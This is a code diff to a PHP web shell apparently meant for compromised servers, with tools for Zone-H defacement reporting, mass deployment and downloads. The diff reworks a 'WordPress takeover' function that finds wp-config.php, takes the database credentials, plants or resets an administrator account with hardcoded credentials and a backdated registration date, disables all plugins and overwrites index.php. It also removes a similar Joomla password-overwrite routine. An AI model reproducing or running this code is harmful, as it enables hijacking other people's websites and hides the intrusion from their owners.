@@ -200,280 +200,316 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
+// Auto-find WordPress config
+function RBPfindWPConfig($startDir = null) {
+    if ($startDir === null) {
+        $startDir = getcwd();
+    }
+    
+    $dirsToCheck = [$startDir];
+    $checkedDirs = [];
+    
+    while (!empty($dirsToCheck)) {
+        $currentDir = array_shift($dirsToCheck);
+        $checkedDirs[] = $currentDir;
+        
+        // Check for wp-config.php in current directory
+        $wpConfig = $currentDir . '/wp-config.php';
+        if (file_exists($wpConfig)) {
+            return $wpConfig;
+        }
+        
+        // Scan subdirectories
+        if (is_dir($currentDir) && $handle = opendir($currentDir)) {
+            while (false !== ($entry = readdir($handle))) {
+                if ($entry != "." && $entry != "..") {
+                    $fullPath = $currentDir . '/' . $entry;
+                    if (is_dir($fullPath) && !in_array($fullPath, $checkedDirs)) {
+                        $dirsToCheck[] = $fullPath;
+                    }
+                }
+            }
+            closedir($handle);
+        }
+    }
+    
+    return null;
+}
+
 // WordPress User Editor Function
-function RBPeditWordPressUser($configPath, $newUser, $newPass) {
+function RBPeditWordPressUser() {
     $result = [];
     
-    if (!file_exists($configPath)) {
-        $result['error'] = "❌ WordPress configuration file not found at: $configPath";
+    // Auto-detect wp-config.php
+    $wpConfigPath = RBPfindWPConfig();
+    
+    if (!$wpConfigPath) {
+        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found!";
         return $result;
     }
     
-    // Generate the WordPress takeover script
-    $wpScript = "<?php
-\$new_user_login = '$newUser';
-\$new_user_pass  = '$newPass';
-\$new_user_email = 'admin@example.com';
+    $result['wp_config_path'] = $wpConfigPath;
+    $wpDir = dirname($wpConfigPath);
+    
+    // Default credentials
+    $new_user_login = 'ReaperBythe222@';
+    $new_user_pass  = 'ReaperBythe222@';
+    $new_user_email = 'admin@example.com';
 
-\$wp_config_path = __DIR__ . '/wp-config.php';
-\$wp_index_path  = __DIR__ . '/index.php';
+    $wp_index_path  = $wpDir . '/index.php';
 
-function parse_wp_config_constants(\$file_path, \$constants = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']) {
-    \$values = [];
-    \$content = file_get_contents(\$file_path);
-    foreach (\$constants as \$const) {
-        if (preg_match(\"/define\\s*\\(\\s*['\\\"]\" . preg_quote(\$const, '/') . \"['\\\"]\\s*,\\s*['\\\"]([^'\\\"]+)['\\\"]\\s*\\)/\", \$content, \$matches)) {
-            \$values[\$const] = \$matches[1];
-        } else {
-            \$values[\$const] = null;
-        }
-    }
-    return \$values;
-}
-
-function parse_table_prefix(\$file_path) {
-    \$content = file_get_contents(\$file_path);
-    if (preg_match(\"/\\\\\\\$table_prefix\\s*=\\s*['\\\"]([^'\\\"]+)['\\\"]\\s*;/\", \$content, \$matches)) {
-        return \$matches[1];
-    }
-    return 'wp_';
-}
-
-function detect_default_theme() {
-    \$themes_dir = __DIR__ . '/wp-content/themes';
-    \$default_theme = 'twentytwentyfour';
-
-    if (is_dir(\$themes_dir)) {
-        \$themes = scandir(\$themes_dir);
-        \$candidates = [];
-        foreach (\$themes as \$theme) {
-            if (preg_match('/^twenty(\\\d{2,4})\$/', \$theme, \$matches)) {
-                \$candidates[\$matches[1]] = \$theme;
+    function parse_wp_config_constants($file_path, $constants = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']) {
+        $values = [];
+        $content = file_get_contents($file_path);
+        foreach ($constants as $const) {
+            if (preg_match("/define\s*\(\s*['\"]" . preg_quote($const, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
+                $values[$const] = $matches[1];
+            } else {
+                $values[$const] = null;
             }
         }
-        if (!empty(\$candidates)) {
-            krsort(\$candidates);
-            \$default_theme = reset(\$candidates);
-        }
+        return $values;
     }
-    return \$default_theme;
-}
 
-function restore_wordpress_index(\$index_path) {
-    \$default_content = \"<?php
+    function parse_table_prefix($file_path) {
+        $content = file_get_contents($file_path);
+        if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $content, $matches)) {
+            return $matches[1];
+        }
+        return 'wp_';
+    }
+
+    function detect_default_theme($wp_dir) {
+        $themes_dir = $wp_dir . '/wp-content/themes';
+        $default_theme = 'twentytwentyfour';
+
+        if (is_dir($themes_dir)) {
+            $themes = scandir($themes_dir);
+            $candidates = [];
+            foreach ($themes as $theme) {
+                if (preg_match('/^twenty(\d{2,4})$/', $theme, $matches)) {
+                    $candidates[$matches[1]] = $theme;
+                }
+            }
+            if (!empty($candidates)) {
+                krsort($candidates);
+                $default_theme = reset($candidates);
+            }
+        }
+        return $default_theme;
+    }
+
+    function restore_wordpress_index($index_path) {
+        $default_content = "<?php
 define( 'WP_USE_THEMES', true );
-require __DIR__ . '/wp-blog-header.php';\";
+require __DIR__ . '/wp-blog-header.php';";
 
-    if (file_exists(\$index_path)) {
-        unlink(\$index_path);
-    }
-    file_put_contents(\$index_path, \$default_content);
-}
-
-class PasswordHash {
-    private \$itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-    private \$iteration_count_log2;
-    private \$portable_hashes;
-    private \$random_state;
-
-    public function __construct(\$iteration_count_log2 = 8, \$portable_hashes = true) {
-        \$this->iteration_count_log2 = \$iteration_count_log2;
-        \$this->portable_hashes      = \$portable_hashes;
-        \$this->random_state         = microtime() . uniqid(rand(), true);
-    }
-
-    private function get_random_bytes(\$count) {
-        \$output = '';
-        if ((\$fh = @fopen('/dev/urandom', 'rb'))) {
-            \$output = fread(\$fh, \$count);
-            fclose(\$fh);
+        if (file_exists($index_path)) {
+            unlink($index_path);
         }
-        if (strlen(\$output) < \$count) {
-            \$output = '';
-            for (\$i = 0; \$i < \$count; \$i += 16) {
-                \$this->random_state = md5(microtime() . \$this->random_state);
-                \$output .= pack('H*', md5(\$this->random_state));
+        file_put_contents($index_path, $default_content);
+    }
+
+    class PasswordHash {
+        private $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        private $iteration_count_log2;
+        private $portable_hashes;
+        private $random_state;
+
+        public function __construct($iteration_count_log2 = 8, $portable_hashes = true) {
+            $this->iteration_count_log2 = $iteration_count_log2;
+            $this->portable_hashes      = $portable_hashes;
+            $this->random_state         = microtime() . uniqid(rand(), true);
+        }
+
+        private function get_random_bytes($count) {
+            $output = '';
+            if (($fh = @fopen('/dev/urandom', 'rb'))) {
+                $output = fread($fh, $count);
+                fclose($fh);
             }
-            \$output = substr(\$output, 0, \$count);
+            if (strlen($output) < $count) {
+                $output = '';
+                for ($i = 0; $i < $count; $i += 16) {
+                    $this->random_state = md5(microtime() . $this->random_state);
+                    $output .= pack('H*', md5($this->random_state));
+                }
+                $output = substr($output, 0, $count);
+            }
+            return $output;
         }
-        return \$output;
-    }
 
-    private function encode64(\$input, \$count) {
-        \$output = '';
-        \$i = 0;
-        do {
-            \$value = ord(\$input[\$i++]);
-            \$output .= \$this->itoa64[\$value & 0x3f];
-            if (\$i < \$count)
-                \$value |= ord(\$input[\$i]) << 8;
-            else
-                \$output .= \$this->itoa64[(\$value >> 6) & 0x3f];
-            if (\$i++ >= \$count)
-                break;
-            if (\$i < \$count)
-                \$value |= ord(\$input[\$i]) << 16;
-            else
-                \$output .= \$this->itoa64[(\$value >> 12) & 0x3f];
-            \$output .= \$this->itoa64[(\$value >> 18) & 0x3f];
-        } while (\$i < \$count);
-        return \$output;
-    }
-
-    public function gensalt_private(\$input) {
-        \$output = '\$P\$';
-        \$output .= \$this->itoa64[min(\$this->iteration_count_log2 + 5, 30)];
-        \$output .= \$this->encode64(\$input, 6);
-        return \$output;
-    }
-
-    public function crypt_private(\$password, \$setting) {
-        \$output = '*0';
-        if (substr(\$setting, 0, 2) === \$output)
-            \$output = '*1';
-        \$id = substr(\$setting, 0, 3);
-        if (\$id !== '\$P\$' && \$id !== '\$H\$')
-            return \$output;
-        \$count_log2 = strpos(\$this->itoa64, \$setting[3]);
-        if (\$count_log2 < 7 || \$count_log2 > 30)
-            return \$output;
-        \$count = 1 << \$count_log2;
-        \$salt  = substr(\$setting, 4, 8);
-        if (strlen(\$salt) !== 8)
-            return \$output;
-        \$hash = md5(\$salt . \$password, true);
-        do {
-            \$hash = md5(\$hash . \$password, true);
-        } while (--\$count);
-        \$output = substr(\$setting, 0, 12);
-        \$output .= \$this->encode64(\$hash, 16);
-        return \$output;
-    }
-
-    public function HashPassword(\$password) {
-        \$random = \$this->get_random_bytes(6);
-        \$hash = \$this->crypt_private(\$password, \$this->gensalt_private(\$random));
-        if (strlen(\$hash) === 34) return \$hash;
-        return md5(\$password);
-    }
-}
-
-if (!file_exists(\$wp_config_path)) {
-    exit;
-}
-
-\$db_constants = parse_wp_config_constants(\$wp_config_path);
-\$table_prefix = parse_table_prefix(\$wp_config_path);
-
-if (in_array(null, \$db_constants, true)) {
-    exit;
-}
-
-\$db_name     = \$db_constants['DB_NAME'];
-\$db_user     = \$db_constants['DB_USER'];
-\$db_password = \$db_constants['DB_PASSWORD'];
-\$db_host     = \$db_constants['DB_HOST'];
-
-\$mysqli = new mysqli(\$db_host, \$db_user, \$db_password, \$db_name);
-if (\$mysqli->connect_error) {
-    exit;
-}
-
-\$hasher = new PasswordHash();
-\$password_hash = \$hasher->HashPassword(\$new_user_pass);
-
-\$stmt = \$mysqli->prepare(\"SELECT ID FROM `{\$table_prefix}users` WHERE user_login = ?\");
-\$stmt->bind_param('s', \$new_user_login);
-\$stmt->execute();
-\$stmt->bind_result(\$existing_user_id);
-\$user_exists = \$stmt->fetch();
-\$stmt->close();
-
-if (\$user_exists) {
-    \$stmt = \$mysqli->prepare(\"UPDATE `{\$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?\");
-    \$stmt->bind_param('ssi', \$password_hash, \$new_user_email, \$existing_user_id);
-    if (!\$stmt->execute()) {
-        exit;
-    }
-    \$stmt->close();
-} else {
-    \$time = date('Y-m-d H:i:s', rand(strtotime('2020-01-01'), strtotime('2023-12-31')));
-    \$stmt = \$mysqli->prepare(\"
-    INSERT INTO `{\$table_prefix}users` 
-    (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
-    VALUES (?, ?, ?, ?, '', ?, '', 0, ?)
-    \");
-
-    \$user_nicename = strtolower(\$new_user_login);
-    \$display_name  = \$new_user_login;
-    \$stmt->bind_param('ssssss', \$new_user_login, \$password_hash, \$user_nicename, \$new_user_email, \$time, \$display_name);
-    if (!\$stmt->execute()) {
-        exit;
-    }
-    \$new_user_id = \$stmt->insert_id;
-    \$stmt->close();
-
-    \$cap_key = \$table_prefix . 'capabilities';
-    \$level_key = \$table_prefix . 'user_level';
-    \$capabilities = serialize(['administrator' => true]);
-
-    \$stmt = \$mysqli->prepare(\"INSERT INTO `{\$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)\");
-    \$stmt->bind_param('iss', \$new_user_id, \$cap_key, \$capabilities);
-    \$stmt->execute();
-    \$stmt->close();
-
-    \$user_level = 10;
-    \$level_value = (string)\$user_level;
-    \$stmt = \$mysqli->prepare(\"INSERT INTO `{\$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)\");
-    \$stmt->bind_param('iss', \$new_user_id, \$level_key,\$level_value);
-    \$stmt->execute();
-    \$stmt->close();
-}
-
-\$empty_plugins = serialize([]);
-\$stmt = \$mysqli->prepare(\"UPDATE `{\$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'\");
-\$stmt->bind_param('s', \$empty_plugins);
-\$stmt->execute();
-\$stmt->close();
-
-\$default_theme = detect_default_theme();
-\$stmt = \$mysqli->prepare(\"UPDATE `{\$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')\");
-\$stmt->bind_param('s', \$default_theme);
-\$stmt->execute();
-\$stmt->close();
-
-restore_wordpress_index(\$wp_index_path);
-
-\$mysqli->close();
-?>
-";
-
-    // Create the takeover script file
-    $takeoverFile = dirname($configPath) . '/wp-takeover.php';
-    if (file_put_contents($takeoverFile, $wpScript)) {
-        // Execute the takeover script
-        $takeoverUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . dirname($_SERVER['REQUEST_URI']) . '/wp-takeover.php';
-        
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $takeoverUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        // Clean up the takeover file
-        unlink($takeoverFile);
-        
-        if ($httpCode === 200) {
-            $result['success'] = "✅ WordPress user updated successfully! New credentials: $newUser / $newPass";
-        } else {
-            $result['error'] = "❌ WordPress takeover failed (HTTP $httpCode)";
+        private function encode64($input, $count) {
+            $output = '';
+            $i = 0;
+            do {
+                $value = ord($input[$i++]);
+                $output .= $this->itoa64[$value & 0x3f];
+                if ($i < $count)
+                    $value |= ord($input[$i]) << 8;
+                else
+                    $output .= $this->itoa64[($value >> 6) & 0x3f];
+                if ($i++ >= $count)
+                    break;
+                if ($i < $count)
+                    $value |= ord($input[$i]) << 16;
+                else
+                    $output .= $this->itoa64[($value >> 12) & 0x3f];
+                $output .= $this->itoa64[($value >> 18) & 0x3f];
+            } while ($i < $count);
+            return $output;
         }
+
+        public function gensalt_private($input) {
+            $output = '$P$';
+            $output .= $this->itoa64[min($this->iteration_count_log2 + 5, 30)];
+            $output .= $this->encode64($input, 6);
+            return $output;
+        }
+
+        public function crypt_private($password, $setting) {
+            $output = '*0';
+            if (substr($setting, 0, 2) === $output)
+                $output = '*1';
+            $id = substr($setting, 0, 3);
+            if ($id !== '$P$' && $id !== '$H$')
+                return $output;
+            $count_log2 = strpos($this->itoa64, $setting[3]);
+            if ($count_log2 < 7 || $count_log2 > 30)
+                return $output;
+            $count = 1 << $count_log2;
+            $salt  = substr($setting, 4, 8);
+            if (strlen($salt) !== 8)
+                return $output;
+            $hash = md5($salt . $password, true);
+            do {
+                $hash = md5($hash . $password, true);
+            } while (--$count);
+            $output = substr($setting, 0, 12);
+            $output .= $this->encode64($hash, 16);
+            return $output;
+        }
+
+        public function HashPassword($password) {
+            $random = $this->get_random_bytes(6);
+            $hash = $this->crypt_private($password, $this->gensalt_private($random));
+            if (strlen($hash) === 34) return $hash;
+            return md5($password);
+        }
+    }
+
+    $db_constants = parse_wp_config_constants($wpConfigPath);
+    $table_prefix = parse_table_prefix($wpConfigPath);
+
+    if (in_array(null, $db_constants, true)) {
+        $result['error'] = "❌ Could not parse WordPress database configuration";
+        return $result;
+    }
+
+    $db_name     = $db_constants['DB_NAME'];
+    $db_user     = $db_constants['DB_USER'];
+    $db_password = $db_constants['DB_PASSWORD'];
+    $db_host     = $db_constants['DB_HOST'];
+
+    $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+    if ($mysqli->connect_error) {
+        $result['error'] = "❌ Database connection failed: " . $mysqli->connect_error;
+        return $result;
+    }
+
+    $hasher = new PasswordHash();
+    $password_hash = $hasher->HashPassword($new_user_pass);
+
+    $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
+    $stmt->bind_param('s', $new_user_login);
+    $stmt->execute();
+    $stmt->bind_result($existing_user_id);
+    $user_exists = $stmt->fetch();
+    $stmt->close();
+
+    if ($user_exists) {
+        $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
+        $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
+        if (!$stmt->execute()) {
+            $result['error'] = "❌ Failed to update existing user";
+            $mysqli->close();
+            return $result;
+        }
+        $stmt->close();
+        $result['action'] = 'updated';
     } else {
-        $result['error'] = "❌ Failed to create takeover script";
+        $time = date('Y-m-d H:i:s', rand(strtotime('2020-01-01'), strtotime('2023-12-31')));
+        $stmt = $mysqli->prepare("
+        INSERT INTO `{$table_prefix}users` 
+        (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
+        VALUES (?, ?, ?, ?, '', ?, '', 0, ?)
+        ");
+
+        $user_nicename = strtolower($new_user_login);
+        $display_name  = $new_user_login;
+        $stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);
+        if (!$stmt->execute()) {
+            $result['error'] = "❌ Failed to create new user";
+            $mysqli->close();
+            return $result;
+        }
+        $new_user_id = $stmt->insert_id;
+        $stmt->close();
+
+        $cap_key = $table_prefix . 'capabilities';
+        $level_key = $table_prefix . 'user_level';
+        $capabilities = serialize(['administrator' => true]);
+
+        $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+        $stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
+        if (!$stmt->execute()) {
+            $result['error'] = "❌ Failed to set user capabilities";
+            $mysqli->close();
+            return $result;
+        }
+        $stmt->close();
+
+        $user_level = 10;
+        $level_value = (string)$user_level;
+        $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+        $stmt->bind_param('iss', $new_user_id, $level_key,$level_value);
+        if (!$stmt->execute()) {
+            $result['error'] = "❌ Failed to set user level";
+            $mysqli->close();
+            return $result;
+        }
+        $stmt->close();
+        $result['action'] = 'created';
     }
+
+    $empty_plugins = serialize([]);
+    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
+    $stmt->bind_param('s', $empty_plugins);
+    $stmt->execute();
+    $stmt->close();
+
+    $default_theme = detect_default_theme($wpDir);
+    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
+    $stmt->bind_param('s', $default_theme);
+    $stmt->execute();
+    $stmt->close();
+
+    restore_wordpress_index($wp_index_path);
+
+    $mysqli->close();
+
+    // Get WordPress login URL
+    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
+    $host = $_SERVER['HTTP_HOST'];
+    $path = dirname($_SERVER['REQUEST_URI']);
+    
+    // Find WordPress root relative to current script
+    $wpRoot = str_replace(getcwd(), '', $wpDir);
+    $loginUrl = $protocol . $host . $wpRoot . '/wp-login.php';
+    
+    $result['success'] = "✅ WordPress user " . $result['action'] . " successfully!";
+    $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
+    $result['login_url'] = $loginUrl;
     
     return $result;
 }
@@ -565,28 +601,14 @@ if (isset($_POST['mass_delete'])) {
 // WordPress User Editor Handler
 if (isset($_POST['wp_edit_user_submit'])) {
     $isPostAction = true;
-    $newUser = $_POST['wp_user_baru'] ?? 'audywebmuchy@112';
-    $newPass = $_POST['wp_pass_baru'] ?? 'audywebmuchy@112';
-    $configPath = $_POST['wp_config_path'] ?? $currentDir . '/wp-config.php';
     
-    $result = RBPeditWordPressUser($configPath, $newUser, $newPass);
+    $result = RBPeditWordPressUser();
     
-    $resultHtml = '<h3>WordPress User Editor</h3>';
-    $resultHtml .= '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+    // Store results in session to display on next page load
+    $_SESSION['wp_edit_results'] = $result;
     
-    if (isset($result['success'])) {
-        $resultHtml .= '<p style="color: lime;">' . htmlspecialchars($result['success']) . '</p>';
-    } elseif (isset($result['error'])) {
-        $resultHtml .= '<p style="color: red;">' . htmlspecialchars($result['error']) . '</p>';
-    }
-    
-    $resultHtml .= '</div>';
-    $resultHtml .= '<div style="text-align: center; margin-top: 15px;"><button onclick="RBPclosePopup(\'wpedituserPopup\')" class="tool-button">Close</button></div>';
-    
-    echo "<script>
-        document.getElementById('wpedituserPopup').style.display = 'block';
-        document.getElementById('wpedituserContent').innerHTML = '" . addslashes($resultHtml) . "';
-    </script>";
+    // Redirect back to main page
+    header("Location: ?wp_edit_complete=1");
     exit;
 }
 
@@ -684,109 +706,6 @@ if (isset($_POST['zoneh_submit'])) {
     echo "<script>
         document.getElementById('zonehPopup').style.display = 'block';
         document.getElementById('zonehContent').innerHTML = '" . addslashes($resultHtml) . "';
-    </script>";
-    exit;
-}
-
-// Auto Edit User Config Functionality (Joomla - kept for backward compatibility)
-if (isset($_POST['edit_user_submit'])) {
-    $isPostAction = true;
-    function RBPambil($string, $start, $end) {
-        $str = explode($start, $string);
-        if (isset($str[1])) {
-            $str = explode($end, $str[1]);
-            return $str[0];
-        }
-        return '';
-    }
-    
-    $user_baru = $_POST['user_baru'] ?? '';
-    $pass_baru = $_POST['pass_baru'] ?? '';
-    
-    if (strlen($user_baru) < 6 || strlen($pass_baru) < 6) {
-        echo "<script>alert('Username and password must be at least 6 characters'); window.location.href = '?' + Math.random();</script>";
-        exit;
-    }
-    
-    $user_baru = $_POST['user_baru'];
-    $pass_baru = md5($_POST['pass_baru']);
-    $conf = $_POST['config_dir'] ?? '';
-    
-    $resultHtml = '<h3>Auto Edit User Config</h3>';
-    $resultHtml .= '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
-    
-    if (!is_dir($conf)) {
-        $resultHtml .= '<p style="color: red;">Config directory not found!</p>';
-    } else {
-        $scan_conf = scandir($conf);
-        $found = false;
-        
-        if ($scan_conf) {
-            foreach($scan_conf as $file_conf) {
-                if($file_conf == '.' || $file_conf == '..' || !is_file("$conf/$file_conf")) continue;
-                
-                $config = file_get_contents("$conf/$file_conf");
-                if(preg_match("/JConfig|joomla/",$config)) {
-                    $found = true;
-                    $dbhost = RBPambil($config,"host = '","'");
-                    $dbuser = RBPambil($config,"user = '","'");
-                    $dbpass = RBPambil($config,"password = '","'");
-                    $dbname = RBPambil($config,"db = '","'");
-                    $dbprefix = RBPambil($config,"dbprefix = '","'");
-                    $prefix = $dbprefix."users";
-                    
-                    $resultHtml .= "<p><strong>Config:</strong> ".$file_conf."</p>";
-                    $resultHtml .= "<p><strong>CMS:</strong> Joomla</p>";
-                    
-                    // Use mysqli instead of deprecated mysql functions
-                    $conn = @mysqli_connect($dbhost, $dbuser, $dbpass);
-                    if ($conn) {
-                        $db = @mysqli_select_db($conn, $dbname);
-                        
-                        if($db) {
-                            $q = @mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
-                            if ($q) {
-                                $result = @mysqli_fetch_array($q);
-                                $id = $result['id'] ?? 0;
-                                $site = RBPambil($config,"sitename = '","'");
-                                $update = @mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
-                                
-                                if($site == '') {
-                                    $resultHtml .= "<p><strong>Site:</strong> <span style=\"color:red;\">Cannot get domain name</span></p>";
-                                } else {
-                                    $resultHtml .= "<p><strong>Site:</strong> $site</p>";
-                                }
-                                
-                                if(!$update) {
-                                    $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Update failed: ".@mysqli_error($conn)."</span></p>";
-                                } else {
-                                    $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:lime;\">Successfully edited user, please login with new credentials.</span></p>";
-                                }
-                            } else {
-                                $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Query failed: ".@mysqli_error($conn)."</span></p>";
-                            }
-                            @mysqli_close($conn);
-                        } else {
-                            $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Database selection failed</span></p>";
-                        }
-                    } else {
-                        $resultHtml .= "<p><strong>Status:</strong> <span style=\"color:red;\">Database connection failed</span></p>";
-                    }
-                }
-            }
-        }
-        
-        if (!$found) {
-            $resultHtml .= '<p style="color: red;">No Joomla configuration files found in the specified directory.</p>';
-        }
-    }
-    
-    $resultHtml .= '</div>';
-    $resultHtml .= '<div style="text-align: center; margin-top: 15px;"><button onclick="RBPclosePopup(\'edituserPopup\')" class="tool-button">Close</button></div>';
-    
-    echo "<script>
-        document.getElementById('edituserPopup').style.display = 'block';
-        document.getElementById('edituserContent').innerHTML = '" . addslashes($resultHtml) . "';
     </script>";
     exit;
 }
@@ -1173,6 +1092,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             max-height: 80vh;
             overflow-y: auto;
         }
+        
+        .success-box {
+            background: #1a3c1a;
+            border: 2px solid #4CAF50;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        
+        .login-link {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 10px 0;
+            transition: all 0.3s ease;
+        }
+        
+        .login-link:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+        }
     </style>
     <script>
         function RBPpostDir(dir) {
@@ -1235,10 +1179,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         
         function RBPshowZoneHPopup() {
             document.getElementById('zonehPopup').style.display = 'block';
-        }
-        
-        function RBPshowEditUserPopup() {
-            document.getElementById('edituserPopup').style.display = 'block';
         }
         
         function RBPshowWPEditUserPopup() {
@@ -1428,68 +1368,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             window.open('?download=1', '_blank');
         }
         
-        function RBPsubmitEditUser() {
-            var form = document.createElement("form");
-            form.method = "post";
-            
-            var input1 = document.createElement("input");
-            input1.name = "config_dir";
-            input1.value = document.getElementById('config_dir').value;
-            
-            var input2 = document.createElement("input");
-            input2.name = "user_baru";
-            input2.value = document.getElementById('user_baru').value;
-            
-            var input3 = document.createElement("input");
-            input3.name = "pass_baru";
-            input3.value = document.getElementById('pass_baru').value;
-            
-            var input4 = document.createElement("input");
-            input4.name = "edit_user_submit";
-            input4.value = "1";
-            
-            var input5 = document.createElement("input");
-            input5.name = "d";
-            input5.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
-            form.appendChild(input4);
-            form.appendChild(input5);
-            document.body.appendChild(form);
-            form.submit();
-        }
-        
         function RBPsubmitWPEditUser() {
             var form = document.createElement("form");
             form.method = "post";
             
             var input1 = document.createElement("input");
-            input1.name = "wp_config_path";
-            input1.value = document.getElementById('wp_config_path').value;
+            input1.name = "wp_edit_user_submit";
+            input1.value = "1";
             
             var input2 = document.createElement("input");
-            input2.name = "wp_user_baru";
-            input2.value = document.getElementById('wp_user_baru').value;
-            
-            var input3 = document.createElement("input");
-            input3.name = "wp_pass_baru";
-            input3.value = document.getElementById('wp_pass_baru').value;
-            
-            var input4 = document.createElement("input");
-            input4.name = "wp_edit_user_submit";
-            input4.value = "1";
-            
-            var input5 = document.createElement("input");
-            input5.name = "d";
-            input5.value = "<?php echo base64_encode($currentDir); ?>";
+            input2.name = "d";
+            input2.value = "<?php echo base64_encode($currentDir); ?>";
             
             form.appendChild(input1);
             form.appendChild(input2);
-            form.appendChild(input3);
-            form.appendChild(input4);
-            form.appendChild(input5);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1499,6 +1391,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             <?php if (isset($_SESSION['mass_deploy_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php elseif (isset($_SESSION['mass_delete_results'])): ?>
+            document.getElementById('resultsPopup').style.display = 'block';
+            <?php elseif (isset($_SESSION['wp_edit_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php endif; ?>
         };
@@ -1514,8 +1408,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         <div class="toolbar">
             <button onclick="RBPshowAdminerPopup()" class="tool-button">Adminer</button>
             <button onclick="RBPshowZoneHPopup()" class="tool-button">Zone-H</button>
-            <button onclick="RBPshowEditUserPopup()" class="tool-button">Edit User (Joomla)</button>
-            <button onclick="RBPshowWPEditUserPopup()" class="tool-button">Edit User (WordPress)</button>
+            <button onclick="RBPshowWPEditUserPopup()" class="tool-button">Edit WordPress User</button>
             <button onclick="RBPshowWgetPopup()" class="tool-button">WGET Download</button>
             <button onclick="RBPshowMassDeployPopup()" class="tool-button">Auto Mass Deploy</button>
         </div>
@@ -1575,6 +1468,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 unset($_SESSION['mass_delete_results']);
                 unset($_SESSION['mass_delete_filename']);
                 unset($_SESSION['mass_delete_base']);
+            } elseif (isset($_SESSION['wp_edit_results'])) {
+                $result = $_SESSION['wp_edit_results'];
+                
+                echo '<h3>WordPress User Editor</h3>';
+                
+                if (isset($result['error'])) {
+                    echo '<div style="background: #3c1a1a; border: 2px solid #f44336; border-radius: 8px; padding: 20px; margin: 15px 0;">';
+                    echo '<p style="color: #ff6b6b; font-size: 16px; margin: 0;">' . htmlspecialchars($result['error']) . '</p>';
+                    echo '</div>';
+                } elseif (isset($result['success'])) {
+                    echo '<div class="success-box">';
+                    echo '<p style="color: #4CAF50; font-size: 18px; font-weight: bold; margin-bottom: 15px;">' . htmlspecialchars($result['success']) . '</p>';
+                    echo '<p style="color: #fff; margin: 10px 0;"><strong>' . htmlspecialchars($result['credentials']) . '</strong></p>';
+                    
+                    if (isset($result['login_url'])) {
+                        echo '<a href="' . htmlspecialchars($result['login_url']) . '" target="_blank" class="login-link">';
+                        echo '🔐 Login to WordPress Admin';
+                        echo '</a>';
